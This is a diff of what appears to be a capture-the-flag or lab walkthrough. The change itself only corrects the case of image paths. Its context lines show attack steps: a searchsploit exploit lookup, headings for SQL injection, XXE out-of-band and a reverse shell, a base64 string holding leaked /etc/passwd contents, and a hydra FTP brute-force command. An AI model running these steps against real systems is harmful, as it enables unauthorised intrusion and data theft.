@@ -77,7 +77,7 @@ searchsploit -x php/webapps/6766.txt
 
 ![](/img2/Pasted%20image%2020250323182626.png)
 
-![](/Img2/Pasted%20image%2020250323192238.png)
+![](/img2/Pasted%20image%2020250323192238.png)
 
 - Find SQLI Time Based (OPTION 2)
 
@@ -407,7 +407,7 @@ python3 -m http.server 80
 
 - Find leaked data 
 
-![](/Img2/Pasted%20image%2020250323200051.png)
+![](/img2/Pasted%20image%2020250323200051.png)
 
 - FInd XXE Out-of-Band (OOB)
 
@@ -446,7 +446,7 @@ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3
 hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.147 -t 50
 ```
 
-![](/Img2/Pasted%20image%2020250323213303.png)
+![](/img2/Pasted%20image%2020250323213303.png)
 
 - Reverse shell
 
